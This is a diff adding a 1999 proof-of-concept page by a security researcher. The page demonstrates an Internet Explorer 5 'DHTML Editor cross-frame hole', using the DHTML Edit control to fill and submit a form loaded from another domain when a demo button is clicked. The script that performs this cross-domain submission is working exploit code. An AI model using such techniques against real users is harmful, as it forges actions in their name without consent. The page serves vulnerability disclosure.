@@ -1,0 +1,75 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<meta name="keywords"
+content="cuartango,dhtmle hole,dhtmle hole,IE5,IE 5 hole,IE 5,cuartango hole,cuartango,security,security site,security web,hack,security,risk,hole,security hole,explorer">
+<title>DHTMLE vulnerabilities</title>
+</head>
+
+<body>
+<script>
+function fill()
+{
+dh.DOM.forms(0).T1.value="Don Juan Tenorio";
+dh.DOM.forms(0).T2.value="Hosteria del Laurel";
+dh.DOM.forms(0).T3.value="Barrio de Santa Cruz";
+dh.DOM.forms(0).T4.value="Sevilla";
+dh.DOM.forms(0).T5.value="Andalucia";
+dh.DOM.forms(0).T6.value="Spain";
+dh.DOM.forms(0).T7.value="424122225555";
+window.setTimeout("SubmitForm()",1000);
+}
+function SubmitForm()
+{
+dh.DOM.forms(0).submit();
+}
+</script>
+
+
+<h1 align="center"><small><font color="#FF0000">T<strong>he&nbsp; DHTML Editor cross-frame
+hole</strong></font></small></h1>
+<div align="left">
+
+<table border="0" width="765" height="388">
+  <tr>
+    <td width="246" height="359" valign="top">&nbsp;<p><small><font face="Arial">The box in the righ
+    is an DHTML Edit Control Safe for scripting.<br>
+    It shows a form loaded from a <strong>diferent domain</strong> (<em>www.angelfire.com</em>).<br>
+    Click the button below and I will fill the form and submit It.</font></small></p>
+    <p align="center"><small><font face="Arial"><input type="button" value="Demo" name="B1"
+    onclick="fill()"></font></small></p>
+    <p><font face="Arial"><small>Dont worry about the message displayed. It is only a demo.</small><br>
+    <small><br>
+    </small></font></td>
+    <td width="511" height="359">
+    <object classid="clsid:2D360201-FFF5-11d1-8D03-00A0C959BC0A" width="497" height="318"
+    id="dh">
+    </object>
+    <script>
+dh.LoadURL("http://www.angelfire.com/ab/juan123/dhtmle3form.html");
+</script> </td>
+  </tr>
+  <tr>
+    <td width="757" height="21" colspan="2"><p align="center"><font face="Arial"
+    color="#FF0000"><strong><small>A malicious script inserted in a WEB page or in an HTML
+    formated e-mail can submit transactions that will contain your IP address. (Imagine an
+    &nbsp; script writting menaces in the White House guess book)</small></strong></font>.<br>
+    </td>
+  </tr>
+</table>
+</div>
+
+<p align="center"><a href="dhtmle1.html"><font face="Arial">Back to DTHMLE Vulnerabilities<br>
+<br>
+</font></a><font color="#400040">Created by</font> <a
+href="mailto:cuartangojc@mx3.redestb.es">Juan Carlos Garcia Cuartango</a> </p>
+
+<p align="center"><font face="Arial"><img src="/cgi-bin/Count.cgi" width="97" height="24"><small><br>
+</small><font size="1">Visitors since March 22 Año del Señor de 1999</font></font></p>
+
+<p><small>Last update March 23 Año del señor de 1999</small></p>
+
+<p>&nbsp;</p>
+</body>
+</html>
